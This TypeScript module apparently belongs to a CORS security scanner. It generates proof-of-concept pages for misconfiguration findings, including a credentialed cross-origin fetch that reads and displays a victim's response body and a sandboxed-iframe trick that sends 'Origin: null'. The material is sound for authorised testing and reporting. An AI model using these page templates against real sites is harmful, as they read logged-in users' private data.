/**
 * Proof-of-concept page generation.
 *
 * A finding is only worth reporting if a reviewer can reproduce it, and for
 * CORS that means a page served from the accepted origin. These are the
 * smallest pages that demonstrate the read: a credentialed fetch and the
 * response body on screen, with no libraries and nothing exfiltrated anywhere.
 */

import type { AnalysisResult, Finding } from './types.js';

/** Rules a browser-reachable page can actually demonstrate. */
const DEMONSTRABLE = new Set(['CM001', 'CM002', 'CM004', 'CM005', 'CM006', 'CM007']);

export interface Poc {
  readonly rule: string;
  readonly origin: string;
  /** Suggested file name, e.g. `cm001-probe.example.html`. */
  readonly filename: string;
  readonly html: string;
  /** What the reader must do for the page to prove anything. */
  readonly servingInstruction: string;
}

export interface SkippedPoc {
  readonly rule: string;
  readonly reason: string;
}

export interface PocBundle {
  readonly pocs: readonly Poc[];
  readonly skipped: readonly SkippedPoc[];
}

const BANNER = (rule: string, name: string, resource: string, origin: string): string =>
  `<!--
  ================================================================
  TEST ARTEFACT - generated by cors-matrix. NOT a finished exploit.

  Rule      ${rule} - ${name}
  Resource  ${resource}
  Origin    ${origin}

  AUTHORISED TESTING ONLY. Open this page against a system you own
  or have written permission to test. Using it against anything
  else is unlawful in most jurisdictions and will end an engagement
  and a bug bounty account.

  It sends one credentialed request and prints the response into
  this page. It stores nothing and transmits nothing anywhere else.
  Read it before you run it.
  ================================================================
-->`;

function esc(value: string): string {
  return value
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

/** JSON-encode for a JS string literal, keeping `</script>` inert. */
function js(value: string): string {
  return JSON.stringify(value).replace(/</g, '\\u003c');
}

function slug(origin: string): string {
  return origin.replace(/^[a-z]+:\/\//, '').replace(/[^A-Za-z0-9.-]+/g, '-') || 'origin';
}

/** The ordinary case: a page served from the accepted origin. */
function fetchPoc(finding: Finding, resource: string, origin: string): string {
  return `<!doctype html>
${BANNER(finding.rule, finding.name, resource, origin)}
<html lang="en">
<head>
<meta charset="utf-8">
<title>cors-matrix ${esc(finding.rule)} proof of concept</title>
<style>
  body { font: 14px/1.5 system-ui, sans-serif; margin: 2rem; max-width: 60rem; }
  pre { background: #f4f4f5; padding: 1rem; overflow: auto; white-space: pre-wrap; }
  .warn { border-left: 4px solid #b91c1c; padding-left: 1rem; }
</style>
</head>
<body>
<h1>${esc(finding.rule)}: cross-origin read with credentials</h1>
<p class="warn"><strong>Test artefact.</strong> Authorised testing only. This page must be served
from <code>${esc(origin)}</code> for the result below to mean anything &mdash; opened from
<code>file://</code> or any other origin it proves nothing, because the browser will send a
different <code>Origin</code> header.</p>
<p>Resource under test: <code>${esc(resource)}</code></p>
<h2>Result</h2>
<pre id="out">running&hellip;</pre>
<script>
(async () => {
  const out = document.getElementById('out');
  const resource = ${js(resource)};
  try {
    const res = await fetch(resource, {
      method: 'GET',
      credentials: 'include',
      mode: 'cors',
    });
    const body = await res.text();
    out.textContent =
      'origin sent by this page: ' + location.origin + '\\n' +
      'status: ' + res.status + ' ' + res.statusText + '\\n' +
      'response body length: ' + body.length + ' bytes\\n' +
      '--- body ---\\n' + body;
  } catch (err) {
    // A TypeError here is the browser refusing the read, which means the
    // policy did NOT allow this origin. That is a negative result, not a bug
    // in the page: re-check the capture and the serving origin.
    out.textContent =
      'the read was blocked: ' + err + '\\n\\n' +
      'The browser refused to expose the response, so this origin was not allowed ' +
      'for a credentialed request. Confirm the page is served from ' + ${js(origin)} +
      ' and that the session cookie is present for the target host.';
  }
})();
</script>
</body>
</html>
`;
}

/**
 * The null-origin case needs a wrapper.
 *
 * An iframe with `sandbox="allow-scripts"` and *without* `allow-same-origin`
 * has an opaque origin, so the document inside it sends `Origin: null`. That
 * is the whole trick, and it is why `ACAO: null` is not a safe value: the
 * attacker does not need to own a domain, only to get the victim to load a
 * page that embeds the frame.
 */
function nullOriginPoc(finding: Finding, resource: string): string {
  const inner = `<!doctype html><meta charset="utf-8">
<pre id="o">running...</pre>
<script>
(async () => {
  const out = document.getElementById('o');
  try {
    const res = await fetch(${js(resource)}, { credentials: 'include', mode: 'cors' });
    const body = await res.text();
    out.textContent = 'origin sent: ' + (location.origin || 'null') + '\\n'
      + 'status: ' + res.status + '\\n' + body;
  } catch (err) {
    out.textContent = 'blocked: ' + err;
  }
})();
</script>`;

  return `<!doctype html>
${BANNER(finding.rule, finding.name, resource, 'null')}
<html lang="en">
<head>
<meta charset="utf-8">
<title>cors-matrix ${esc(finding.rule)} proof of concept</title>
<style>
  body { font: 14px/1.5 system-ui, sans-serif; margin: 2rem; max-width: 60rem; }
  iframe { width: 100%; height: 22rem; border: 1px solid #d4d4d8; }
  .warn { border-left: 4px solid #b91c1c; padding-left: 1rem; }
</style>
</head>
<body>
<h1>${esc(finding.rule)}: reading with the null origin</h1>
<p class="warn"><strong>Test artefact.</strong> Authorised testing only.</p>
<p>The frame below is sandboxed with <code>allow-scripts</code> and deliberately
<em>without</em> <code>allow-same-origin</code>, which gives the document inside it an opaque
origin. It therefore sends <code>Origin: null</code>, which is the value
<code>${esc(resource)}</code> allows. No domain registration is involved: this page can be
hosted anywhere, including somewhere the victim already trusts.</p>
<iframe sandbox="allow-scripts" srcdoc="${esc(inner)}"></iframe>
</body>
</html>
`;
}

/** Build a PoC page for every finding that a browser can actually demonstrate. */
export function buildPocs(result: AnalysisResult): PocBundle {
  const pocs: Poc[] = [];
  const skipped: SkippedPoc[] = [];
  const seen = new Set<string>();

  for (const f of result.findings) {
    const key = `${f.rule}:${f.origin ?? ''}`;
    if (seen.has(key)) continue;

    if (!DEMONSTRABLE.has(f.rule)) {
      skipped.push({
        rule: f.rule,
        reason:
          `${f.rule} describes a configuration defect rather than a cross-origin read, so there ` +
          'is no page that demonstrates it. Report it from the captured headers.',
      });
      seen.add(key);
      continue;
    }
    if (f.severity !== 'critical' && f.severity !== 'high') {
      skipped.push({
        rule: f.rule,
        reason:
          `${f.rule} was graded ${f.severity} here because credentials are not allowed, so a ` +
          'page served from the accepted origin would read a response carrying no session. ' +
          'Nothing to demonstrate.',
      });
      seen.add(key);
      continue;
    }
    if (!f.browserReachable) {
      skipped.push({
        rule: f.rule,
        reason:
          `${f.rule} is not reachable from a browser — no browser emits that Origin value — so ` +
          'an HTML page cannot demonstrate it. Reproduce it with the client that does.',
      });
      seen.add(key);
      continue;
    }

    seen.add(key);
    if (f.rule === 'CM002') {
      pocs.push({
        rule: f.rule,
        origin: 'null',
        filename: 'cm002-null-origin.html',
        html: nullOriginPoc(f, result.resource),
        servingInstruction:
          'Serve from any origin at all, or open it from disk. The sandboxed frame supplies the ' +
          'null origin, so the hosting origin is irrelevant.',
      });
      continue;
    }

    const origin = f.origin;
    if (origin === undefined) continue;
    pocs.push({
      rule: f.rule,
      origin,
      filename: `${f.rule.toLowerCase()}-${slug(origin)}.html`,
      html: fetchPoc(f, result.resource, origin),
      servingInstruction:
        `Must be served from ${origin} exactly. Point a host you control at it, serve it over ` +
        `the scheme and port in that origin, and visit it in a browser that holds a live session ` +
        `for ${result.resource}.`,
    });
  }

  return { pocs, skipped };
}
